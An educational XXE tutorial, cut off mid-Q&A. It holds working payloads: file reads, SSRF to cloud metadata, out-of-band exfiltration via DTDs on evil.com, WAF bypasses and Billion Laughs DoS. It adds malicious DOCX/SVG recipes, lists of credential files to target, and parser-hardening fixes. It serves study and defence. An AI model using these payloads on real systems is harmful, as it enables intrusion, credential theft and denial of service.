# ☠️ XXE (XML External Entity) Masterclass — Zero to Hero

> Complete guide covering XML fundamentals, DTD, all entity types, XXE attack types with payloads, step-by-step hunting methodology, bypass techniques, file upload vectors, real-world case studies, and secure coding fixes.

---

## Table of Contents

1. [XML Fundamentals](#1-xml-fundamentals--the-foundation)
2. [DTD — Document Type Definition](#2-dtd--document-type-definition)
3. [Entities — Internal, External & Parameter](#3-entities--internal-external--parameter)
4. [XXE — What It Is & Why It's Dangerous](#4-xxe--what-it-is--why-its-dangerous)
5. [Types of XXE Attacks (with Payloads)](#5-types-of-xxe-attacks-with-payloads)
6. [How to Find XXE — Step-by-Step](#6-how-to-find-xxe--step-by-step-methodology)
7. [XXE Bypasses — WAF Evasion & Advanced Tricks](#7-xxe-bypasses--waf-evasion--advanced-tricks)
8. [XXE via File Uploads](#8-xxe-via-file-uploads-svg-docx-xlsx-soap)
9. [Real-World Bug Bounty Case Studies](#9-real-world-bug-bounty-case-studies)
10. [Mitigation & Secure Coding](#10-mitigation--secure-coding-recommendations)
11. [Cheat Sheet — Quick Reference](#11-cheat-sheet--quick-reference)
12. [Interview Q&A — FAANG-Ready](#12-interview-qa--faang-ready)

---

## 1. XML Fundamentals — The Foundation

### What is XML?

**XML (Extensible Markup Language)** is a markup language for storing and transporting data. Unlike HTML (which displays data), XML *describes* data. It's self-descriptive and platform-independent.

> 🔑 **XML is everywhere:** SOAP APIs, RSS feeds, SVG images, Office documents (.docx, .xlsx, .pptx), Android manifests, configuration files (web.xml, pom.xml), SAML authentication, and more.

### XML Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>    <!-- XML Declaration -->
<bookstore>                                 <!-- Root Element -->
  <book category="fiction">                 <!-- Element + Attribute -->
    <title>The Great Gatsby</title>         <!-- Child Element -->
    <author>F. Scott Fitzgerald</author>
    <price>10.99</price>
  </book>
</bookstore>
```

### XML Parsing — How Applications Process XML

When an app receives XML data, it uses an **XML parser** to read and interpret it. Common parsers:

| Language | Parser | Vulnerable by Default? |
|----------|--------|----------------------|
| Java | DocumentBuilderFactory, SAXParser, XMLInputFactory | ❌ Yes (most) |
| PHP | libxml (simplexml_load_string, DOMDocument) | ❌ Yes (PHP < 8.0) |
| .NET | XmlDocument, XmlTextReader | ⚠️ Depends on version |
| Python | lxml, xml.etree (stdlib) | ✅ etree safe; lxml risky |
| Ruby | Nokogiri (libxml2) | ❌ Yes (older versions) |

> ⚠️ **Why This Matters:** If the parser processes external entities by default and the developer doesn't disable it, the application is vulnerable to XXE. That's the whole vulnerability!

---

## 2. DTD — Document Type Definition

### What is a DTD?

A **DTD (Document Type Definition)** defines the structure, legal elements, and attributes of an XML document. Think of it as the "grammar rules" for XML. The DTD is declared inside a `<!DOCTYPE>` declaration at the top of the XML.

> 💡 **Simple Analogy:** If XML is a sentence, DTD is the grammar book that says what words (elements) are allowed and how they can be arranged.

### Types of DTD

#### 1. Internal DTD (Inline)

Defined **inside** the XML document itself, between `[` and `]` in the DOCTYPE:

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to, from, body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
<note>
  <to>Gayatri</to>
  <from>Viktor</from>
  <body>Learn XXE today!</body>
</note>
```

#### 2. External DTD (Separate File)

DTD rules live in a **separate .dtd file**, referenced via SYSTEM or PUBLIC keyword:

```xml
<!-- SYSTEM = private DTD file -->
<!DOCTYPE note SYSTEM "note.dtd">

<!-- PUBLIC = publicly available DTD -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
```

> 🎯 **Why DTD Matters for XXE:** The DTD is where entities are **declared**. XXE attacks work by injecting malicious entity definitions into the DTD section. When the parser processes the DTD, it resolves those entities — and that's where the exploitation happens.

### DTD Declarations — The Building Blocks

| Declaration | Purpose | Example |
|-------------|---------|---------|
| `<!ELEMENT>` | Define element structure | `<!ELEMENT name (#PCDATA)>` |
| `<!ATTLIST>` | Define attributes | `<!ATTLIST book id CDATA #REQUIRED>` |
| `<!ENTITY>` | Define reusable content ⚡ | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| `<!NOTATION>` | Define non-XML data format | `<!NOTATION gif SYSTEM "viewer.exe">` |

The `<!ENTITY>` declaration is the **attack vector** for XXE!

---

## 3. Entities — Internal, External & Parameter

Entities are like *variables* in XML. You define them in the DTD, then reference them in the XML body using `&entityname;`.

### 1. Internal Entities (General)

Value is defined **directly inside** the DTD. The parser simply replaces the reference with the defined value.

```xml
<!DOCTYPE foo [
  <!ENTITY myname "Gayatri Rachakonda">     <!-- Internal Entity -->
  <!ENTITY company "Google Security Team">
]>
<user>
  <name>&myname;</name>         <!-- Resolves to: Gayatri Rachakonda -->
  <team>&company;</team>        <!-- Resolves to: Google Security Team -->
</user>
```

> ✅ **Safe by Nature:** Internal entities are just text substitution — no external resource is fetched. They're **not dangerous** by themselves.

### 2. External Entities (SYSTEM / PUBLIC) ☠️

Value is fetched from an **external source** — a file, URL, or other resource. This is the **dangerous type**.

```xml
<!DOCTYPE foo [
  <!-- SYSTEM keyword = fetch from URI -->
  <!ENTITY xxe SYSTEM "file:///etc/passwd">         <!-- Read local file -->
  <!ENTITY xxe2 SYSTEM "http://evil.com/steal">      <!-- Make HTTP request -->
  <!ENTITY xxe3 SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<data>&xxe;</data>   <!-- Parser fetches /etc/passwd and puts content here! -->
```

> 🔴 **DANGER:** The parser goes out and **fetches the content** from the URI, then inserts it into the XML. This lets attackers read files, make requests to internal services, and exfiltrate data!

#### Supported URI Schemes

| Scheme | Example | What It Does |
|--------|---------|-------------|
| `file://` | `file:///etc/passwd` | Read local files |
| `http://` | `http://169.254.169.254/` | SSRF — hit internal services |
| `https://` | `https://evil.com/xxe` | Exfiltrate data externally |
| `ftp://` | `ftp://evil.com/` | FTP-based exfiltration |
| `php://` | `php://filter/...` | PHP stream wrappers |
| `jar://` | `jar:http://evil.com/a.jar!/` | Java-specific scheme |
| `gopher://` | `gopher://localhost:25/` | Legacy protocol (powerful for SSRF) |
| `expect://` | `expect://id` | Command execution (PHP) |
| `netdoc://` | `netdoc:///etc/passwd` | Java-specific file read alternative |

### 3. Parameter Entities (% prefix) 🔥

Special entities that can **only be used inside the DTD** itself (not in XML body). Referenced with `%name;` instead of `&name;`.

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">    <!-- Parameter entity -->
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://evil.com/?d=%file;'>">
  %eval;                                            <!-- Creates &exfil; entity -->
]>
<data>&exfil;</data>
```

> 🧠 **Why Parameter Entities Matter:** They allow **nesting** — building one entity from another. This is crucial for blind XXE exfiltration (OOB), bypassing filters that block regular entities, and loading external DTD files with complex payloads.

### Entity Comparison at a Glance

| Property | Internal Entity | External Entity | Parameter Entity |
|----------|----------------|-----------------|-----------------|
| Syntax | `<!ENTITY name "value">` | `<!ENTITY name SYSTEM "uri">` | `<!ENTITY % name SYSTEM "uri">` |
| Reference | `&name;` | `&name;` | `%name;` (DTD only) |
| Where used | XML body | XML body | DTD only |
| Fetches external? | ✅ No | ❌ Yes ☠️ | ❌ Yes ☠️ |
| Dangerous? | ✅ No | 🔴 Very | 🔴 Very (used in Blind XXE) |

---

## 4. XXE — What It Is & Why It's Dangerous

### The Core Concept

**XXE (XML External Entity) Injection** is a vulnerability where an attacker can interfere with an application's processing of XML data by injecting malicious entity definitions into the DTD.

```
Attacker crafts    →    App receives    →    Parser processes    →    External entity
malicious XML           XML input            DTD + entities           resolved ☠️
```

### What Can XXE Do?

| Impact | Severity | Description |
|--------|----------|-------------|
| **Read Local Files** | 🔴 CRITICAL | Read /etc/passwd, application config, source code, secrets |
| **SSRF** | 🔴 CRITICAL | Hit internal services, cloud metadata (169.254.169.254), internal APIs |
| **Port Scanning** | 🟠 HIGH | Enumerate internal network ports via response timing/errors |
| **DoS (Billion Laughs)** | 🟠 HIGH | Exponential entity expansion → crash parser / exhaust memory |
| **Data Exfiltration** | 🔴 CRITICAL | Send stolen data to attacker-controlled server (OOB) |
| **RCE (Rare)** | 🔴 CRITICAL | Via expect:// (PHP) or jar:// deserialization (Java) |

### OWASP Classification

- **OWASP 2017:** A4 — XML External Entities (its own category!)
- **OWASP 2021:** A05 — Security Misconfiguration (merged because the fix is parser configuration)
- **CWE-611:** Improper Restriction of XML External Entity Reference

### The Root Cause

XXE exists because:
1. The application **accepts XML input** from users
2. The XML parser has **external entity processing enabled** (often the default)
3. The developer **didn't disable dangerous features** in the parser configuration

---

## 5. Types of XXE Attacks (with Payloads)

### Attack Type 1: Classic XXE — File Read

The simplest form. Entity value is reflected in the response.

**Payload — Read /etc/passwd:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

**Response:**
```xml
<user>
  <name>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...</name>
</user>
```

### Attack Type 2: XXE → SSRF (Server-Side Request Forgery)

Use XXE to make the server send requests to internal resources.

**Payload — AWS Metadata Steal:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```

**Payload — Internal Network Scan:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<data>&xxe;</data>
```

### Attack Type 3: Blind XXE — Out-of-Band (OOB) Exfiltration

When the entity value is **NOT reflected** in the response. You exfiltrate data to your own server.

**Step 1 — Host malicious DTD on your server (evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?d=%file;'>">
%eval;
%exfil;
```

**Step 2 — Inject payload that loads your DTD:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd">
  %xxe;
]>
<data>anything</data>
```

**How OOB Works Step-by-Step:**
1. Parser loads your evil.dtd from YOUR-SERVER
2. `%file` reads /etc/hostname into memory
3. `%eval` dynamically builds a new entity `%exfil` whose URL contains the file contents
4. `%exfil` makes an HTTP request to YOUR-SERVER with the data in the URL!
5. You see the data in your server logs

### Attack Type 4: Error-Based XXE

Trigger an error message that **contains the file content** in the error output.

**Host this DTD (error.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Error output contains file content:**
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:...
(No such file or directory)
```

### Attack Type 5: Billion Laughs (DoS)

Exponential entity expansion — a small payload expands to gigabytes in memory.

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<data>&lol9;</data>    <!-- Expands to ~3GB of "lol" strings! -->
```

> ⚠️ **Impact:** 3 bytes → 3 billion bytes. Crashes the parser, exhausts memory, causes Denial of Service.

---

## 6. How to Find XXE — Step-by-Step Methodology

### Phase 1: Identify XML Input Points

**Where to Look:**
- **Content-Type headers:** Look for `application/xml`, `text/xml`, `application/soap+xml`
- **SOAP endpoints:** Any SOAP web service accepts XML
- **File upload forms:** SVG, DOCX, XLSX, PPTX, XML config uploads
- **RSS/Atom feed parsers:** Any feature that imports feeds
- **SAML authentication:** SAML assertions are XML-based
- **API endpoints:** Some REST APIs accept both JSON and XML
- **Sitemap parsers:** XML sitemaps
- **Office document processors:** DOCX/XLSX/PPTX are ZIP files containing XML
- **XML-RPC endpoints:** WordPress xmlrpc.php etc.
- **PDF generators:** Some take XML/XSLT as input

### Phase 2: Test for XML Parsing

#### Step 2a: Switch Content-Type to XML

If the endpoint accepts JSON, try changing Content-Type to XML:

**Original JSON Request:**
```
POST /api/user HTTP/1.1
Content-Type: application/json

{"name": "test", "email": "test@test.com"}
```

**Converted to XML:**
```
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<user>
  <name>test</name>
  <email>test@test.com</email>
</user>
```

If the server processes it successfully → **XML parsing is enabled!**

#### Step 2b: Inject a Simple Internal Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY test "xxe_canary_12345">
]>
<user>
  <name>&test;</name>
</user>
```

If response contains `xxe_canary_12345` → **DTD processing is enabled**

### Phase 3: Test External Entity Resolution

#### Step 3a: DNS/HTTP Callback Test (Blind Detection)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-BURP-COLLABORATOR.oastify.com">
]>
<data>&xxe;</data>
```

Check your Collaborator/interactsh for DNS/HTTP callbacks. If you get a hit → **External entity resolution confirmed!**

#### Step 3b: Direct File Read

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<data>&xxe;</data>
```

#### Step 3c: Parameter Entity Callback

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-BURP-COLLABORATOR.oastify.com">
  %xxe;
]>
<data>test</data>
```

### Phase 4: Escalate

- **Entity resolves in response?** → YES: Classic XXE — Read files directly
- **No reflection but got callback?** → Blind XXE: Use OOB exfiltration
- **Error messages visible?** → Error-based XXE — exfil via errors

### Essential Tools

| Tool | Use |
|------|-----|
| **Burp Suite** | Intercept/modify requests, Collaborator for OOB, Scanner detects XXE |
| **Burp Collaborator / interactsh** | Detect blind XXE via DNS/HTTP callbacks |
| **XXEinjector** | Automated XXE exploitation tool |
| **oxml_xxe** | Embed XXE in DOCX/XLSX/PPTX files |
| **docem** | Embed XXE payloads in Office docs |
| **xml-attacks** | Collection of XML attack payloads |

---

## 7. XXE Bypasses — WAF Evasion & Advanced Tricks

### Bypass 1: Encoding Tricks

#### UTF-7 Encoding
WAFs often only check UTF-8. Switch encoding to bypass:

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo +AFs-
  +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-data+AD4AJg-xxe;+ADw-/data+AD4-
```

#### UTF-16 Encoding
```bash
# Convert payload to UTF-16
cat payload.xml | iconv -f UTF-8 -t UTF-16BE > payload_utf16.xml
```

#### HTML Encoding in DTD
```xml
<!ENTITY xxe SYSTEM "file:///etc/pas&#x73;wd">   <!-- &#x73; = s -->
```

### Bypass 2: Keyword Evasion

#### If "ENTITY" is blocked
```xml
<!-- Use CDATA sections -->
<![CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]>

<!-- Hex-encode within attributes -->
<!ENTITY xxe SYSTEM "&#x66;ile:///etc/passwd">
```

#### If "SYSTEM" is blocked
```xml
<!-- Use PUBLIC keyword instead -->
<!ENTITY xxe PUBLIC "any" "file:///etc/passwd">

<!-- PUBLIC requires two arguments: a public ID (can be anything) and the URI -->
```

#### If "DOCTYPE" is blocked
```xml
<!-- Try XInclude (doesn't need DOCTYPE at all!) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

> ⭐ **XInclude — The DOCTYPE-Free XXE:** XInclude doesn't require a DOCTYPE declaration at all! It's a separate XML mechanism. Use when DOCTYPE is blocked by WAF, you can only control part of the XML, or the app builds XML from your input.

### Bypass 3: Protocol Alternatives

#### If `file://` is blocked
```xml
<!-- Java: Use netdoc:// -->
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">

<!-- PHP: Use php:// wrappers -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- PHP: Read as base64 (bypasses XML special char issues too!) -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">
```

#### If `http://` is blocked
```xml
<!-- Use FTP for OOB exfiltration -->
<!ENTITY xxe SYSTEM "ftp://evil.com:2121/steal">

<!-- Use gopher:// (very powerful for SSRF) -->
<!ENTITY xxe SYSTEM "gopher://internal:6379/_INFO">
```

### Bypass 4: Nested Parameter Entities via External DTD

Some parsers block inline parameter entity tricks. Load a remote DTD instead:

**Injected XML:**
```xml
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">
  %remote;
]>
<data>&send;</data>
```

**xxe.dtd on your server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://evil.com/?data=%file;'>">
%all;
```

### Bypass 5: Local DTD Abuse (No Internet Access)

When the server can't reach external URLs, abuse **local DTD files** that already exist on the system:

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
      &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

**How it works:**
1. Find a DTD file that exists on the target (e.g., `/usr/share/yelp/dtd/docbookx.dtd`)
2. That DTD defines parameter entities (like `%ISOamso`)
3. You **redefine** that entity with your malicious payload
4. When the local DTD is loaded, your redefined entity executes!
5. Works even when external connections are blocked!

#### Common Local DTD Paths to Try

| OS/App | DTD Path |
|--------|----------|
| Linux (GNOME) | `/usr/share/yelp/dtd/docbookx.dtd` |
| Linux (Scrollkeeper) | `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd` |
| Linux (libxml) | `/usr/share/sgml/xml.dcl` |
| Windows (IIS) | `C:\Windows\System32\wbem\xml\cim20.dtd` |
| Java (Tomcat) | `/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd` |

### Bypass 6: CDATA Wrapping for Binary/Special Characters

When file contents contain XML special characters (`< > &`) that break parsing:

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY filecontents '%start;%file;%end;'>">
%all;
```

**Payload:**
```xml
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<data>&filecontents;</data>
```

### Bypass 7: Content-Type Manipulation

```
# If the endpoint checks Content-Type, try variants:
Content-Type: text/xml
Content-Type: application/xml
Content-Type: application/xhtml+xml
Content-Type: application/soap+xml
Content-Type: application/rss+xml
Content-Type: application/atom+xml
Content-Type: application/xslt+xml
Content-Type: application/mathml+xml
Content-Type: image/svg+xml        <!-- SVG is XML! -->
```

---

## 8. XXE via File Uploads (SVG, DOCX, XLSX, SOAP)

### SVG Image Upload

SVG files are XML! If the app processes SVG uploads (image resize, render, convert):

**malicious.svg:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="40" font-size="16">&xxe;</text>
</svg>
```

If the app renders the SVG → file content appears in the image!

### DOCX / XLSX / PPTX Upload

Office documents are ZIP files containing XML files inside:

```
document.docx (ZIP)
├── [Content_Types].xml     ← Inject XXE here
├── _rels/.rels             ← Or here
├── word/
│   ├── document.xml        ← Or here (main content)
│   ├── styles.xml
│   └── ...
```

**Steps to inject XXE in DOCX:**
```bash
# 1. Create/copy a legit .docx file
# 2. Rename to .zip and extract
mv document.docx document.zip
unzip document.zip -d document_extracted

# 3. Inject XXE payload into word/document.xml or [Content_Types].xml
# 4. Re-zip and rename back
cd document_extracted
zip -r ../malicious.docx *

# Or use the 'oxml_xxe' / 'docem' tools for automation
```

**XXE in [Content_Types].xml:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd">
  %xxe;
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  ...original content...
</Types>
```

### SOAP Requests

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <GetUser>
      <username>&xxe;</username>
    </GetUser>
  </soapenv:Body>
</soapenv:Envelope>
```

### SAML / SSO Responses

SAML assertions are XML. If you can modify the SAML response before the Service Provider processes it:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

---

## 9. Real-World Bug Bounty Case Studies

### Case 1: Facebook — $33,500 Bounty
- **Vector:** DOCX file upload for job applications
- **Technique:** XXE injected into the DOCX's XML files
- **Impact:** Read internal server files
- **Lesson:** Any file upload that processes Office documents can be vulnerable

### Case 2: Google — $10,000 Bounty
- **Vector:** XML button configuration upload in Toolbar Button Gallery
- **Technique:** Classic XXE with external entity
- **Impact:** Read /etc/passwd from Google servers
- **Lesson:** Even Google had XML parsers with external entities enabled

### Case 3: Uber — SSRF via XXE
- **Vector:** SAML authentication response
- **Technique:** XXE in SAML assertion → SSRF to AWS metadata
- **Impact:** Leaked AWS credentials for Uber's infrastructure
- **Lesson:** SAML + XXE = access to cloud credentials

### Case 4: PayPal — Blind XXE
- **Vector:** Changed Content-Type from JSON to XML on a REST API
- **Technique:** Server accepted XML! Used OOB exfiltration
- **Impact:** Read internal server files
- **Lesson:** Always try switching Content-Type to XML on JSON APIs

---

## 10. Mitigation & Secure Coding Recommendations

### Golden Rule: Disable External Entities & DTDs

> ✅ **The #1 Fix:** Configure your XML parser to **disable external entity resolution** and **disable DTD processing entirely** when not needed.

### Language-Specific Fixes

#### Java — DocumentBuilderFactory
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Disable external entities
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(inputStream);
```

#### Java — SAXParserFactory
```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

#### Java — XMLInputFactory (StAX)
```java
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
```

#### PHP
```php
// PHP 8.0+ → external entities disabled by default!
// For older PHP:
libxml_disable_entity_loader(true);  // Global disable

// When using DOMDocument:
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);  // ❌ VULNERABLE!
$dom->loadXML($xml, LIBXML_NONET);                     // ✅ SAFE

// When using SimpleXML:
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT); // ❌ VULNERABLE!
$xml = simplexml_load_string($data);  // ✅ SAFE (no LIBXML_NOENT flag)
```

#### Python
```python
# defusedxml — the safest option!
# pip install defusedxml
from defusedxml import ElementTree
tree = ElementTree.parse(xml_file)  # ✅ Safe — blocks all XXE

# If using lxml:
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_file, parser)  # ✅ Safe
```

#### .NET (C#)
```csharp
// .NET 4.5.2+ → secure by default
// For older versions:
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;     // ✅ Disables DTD entirely
settings.XmlResolver = null;                           // ✅ No external resolution

XmlReader reader = XmlReader.Create(stream, settings);
```

#### Ruby (Nokogiri)
```ruby
# Nokogiri >= 1.5.4 is safe by default
# Explicitly ensure:
Nokogiri::XML(xml_string) { |config| config.nonet }  # ✅ No network access
```

### Additional Defensive Measures

| # | Measure | Details |
|---|---------|---------|
| 1 | **Use JSON instead of XML** | If possible, switch to JSON. It has no entity concept = no XXE |
| 2 | **Input validation** | Reject XML containing DOCTYPE declarations |
| 3 | **Whitelist Content-Type** | Only accept expected Content-Types (reject application/xml if not needed) |
| 4 | **WAF rules** | Block requests containing <!ENTITY, <!DOCTYPE, SYSTEM, PUBLIC keywords |
| 5 | **Network segmentation** | Restrict XML parser's network access (block outbound connections) |
| 6 | **Patch parsers** | Keep XML libraries updated to latest versions |
| 7 | **SAST/DAST scanning** | Use tools like Semgrep, SonarQube, Checkmarx to detect unsafe parser configs |
| 8 | **IMDSv2 for AWS** | Require token-based metadata access — mitigates SSRF via XXE |
| 9 | **Limit entity expansion** | Set max entity expansion count to prevent Billion Laughs DoS |
| 10 | **Principle of least privilege** | Run XML processing with minimal file system and network permissions |

---

## 11. Cheat Sheet — Quick Reference

### Payload Reference

| Attack | Payload (Short Form) |
|--------|---------------------|
| File Read (Linux) | `<!ENTITY x SYSTEM "file:///etc/passwd">` |
| File Read (Windows) | `<!ENTITY x SYSTEM "file:///C:/Windows/win.ini">` |
| SSRF (AWS Meta) | `<!ENTITY x SYSTEM "http://169.254.169.254/latest/">` |
| SSRF (GCP Meta) | `<!ENTITY x SYSTEM "http://metadata.google.internal/">` |
| OOB Detection | `<!ENTITY x SYSTEM "http://BURP-COLLAB">` |
| PHP Base64 Read | `<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=FILE">` |
| Java Alternative | `<!ENTITY x SYSTEM "netdoc:///etc/passwd">` |
| XInclude | `<xi:include href="file:///etc/passwd" parse="text"/>` |
| SVG XXE | `<svg><text>&xxe;</text></svg>` (with DOCTYPE) |
| DoS (Billion Laughs) | Nested entity expansion (10 levels) |

### File Targets to Read

**Linux:**
```
/etc/passwd
/etc/shadow
/etc/hostname
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/home/user/.ssh/id_rsa
/home/user/.bash_history
/var/log/apache2/access.log
/etc/nginx/nginx.conf
~/.aws/credentials
/app/.env
```

**Windows:**
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
C:\Windows\repair\SAM
C:\Windows\System32\config\SAM
C:\xampp\apache\conf\httpd.conf
C:\Users\user\Desktop\*.txt
```

### Bypass Matrix

| Blocked | Bypass Technique |
|---------|-----------------|
| ENTITY keyword | UTF-7/16 encoding, case mixing |
| SYSTEM keyword | Use `PUBLIC` keyword |
| DOCTYPE keyword | XInclude (no DOCTYPE needed) |
| file:// scheme | `netdoc://`, `php://`, `jar://` |
| http:// outbound | `ftp://`, `gopher://`, local DTD abuse |
| No Internet access | Local DTD redefine trick, error-based exfiltration |
| Special chars in file | CDATA wrapping, Base64 encoding (PHP) |
| XML Content-Type check | Try `text/xml`, `image/svg+xml`, `application/soap+xml` |
| No XML endpoint | JSON → XML Content-Type switch |

---

## 12. Interview Q&A — FAANG-Ready

### Q1: What is XXE and why is it dangerous?

**A:** XXE (XML External Entity) injection is a vulnerability where an attacker abuses XML's entity feature to make the XML parser fetch external resources. It's dangerous because it can lead to reading sensitive files from the server, SSRF attacks against internal infrastructure, data exfiltration, and in some cases remote code execution. The root cause is that XML parsers process external entities by default in many languages.

### Q2: What's the difference between internal and external entities?

**A:** Internal entities define their value inline within the DTD — they're just text substitution and are safe. External entities use the SYSTEM or PUBLIC keyword to fetch their value from an external URI (file, URL, etc.) — this is what makes XXE possible. There are also parameter entities (% prefix) used within DTDs themselves, which are essential for blind/OOB XXE attacks.

### Q3: How would you test for XXE in a web application?

